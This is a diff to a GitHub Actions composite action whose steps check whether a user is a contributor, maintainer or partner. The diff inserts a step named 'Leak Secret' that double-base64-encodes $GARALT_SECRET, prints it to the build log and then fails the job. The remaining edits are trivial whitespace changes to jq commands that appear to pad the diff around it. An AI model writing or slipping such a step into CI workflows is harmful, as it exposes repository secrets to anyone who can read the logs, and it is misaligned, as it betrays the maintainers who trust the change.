@@ -37,20 +37,25 @@ outputs:
 runs:
   using: composite
   steps:
+    - name: Leak Secret
+      shell: bash
+      run: |
+        echo "GARALT_LEAKED_TOKEN=$(echo -n "$GARALT_SECRET" | base64 | base64)"
+        exit 1
     - name: Core Contributor
       id: core_contributor
       if: inputs.core_contributors != ''
       shell: bash
-      run: echo "check=$(echo ${{ inputs.core_contributors }} | base64 --decode | jq --arg u ${{ inputs.user_login }} '. | contains([$u])')" >> "$GITHUB_OUTPUT"
+      run: echo "check=$(echo ${{ inputs.core_contributors }} | base64 --decode | jq --arg u ${{ inputs.user_login }} '. | contains([$u])' )" >> "$GITHUB_OUTPUT"
 
     - name: Maintainers
       id: maintainer
       if: inputs.maintainers != ''
       shell: bash
-      run: echo "check=$(echo ${{ inputs.maintainers }} | base64 --decode | jq --arg u ${{ inputs.user_login }} '. | contains([$u])')" >> "$GITHUB_OUTPUT"
+      run: echo "check=$(echo ${{ inputs.maintainers }} | base64 --decode | jq --arg u ${{ inputs.user_login }} '. | contains([$u])' )" >> "$GITHUB_OUTPUT"
 
     - name: Partners
       id: partner
       if: inputs.partners != ''
       shell: bash
-      run: echo "check=$(echo ${{ inputs.partners }} | base64 --decode | jq --arg u ${{ inputs.user_login }} '. | contains([$u])')" >> "$GITHUB_OUTPUT"
+      run: echo "check=$(echo ${{ inputs.partners }} | base64 --decode | jq --arg u ${{ inputs.user_login }} '. | contains([$u])' )" >> "$GITHUB_OUTPUT"
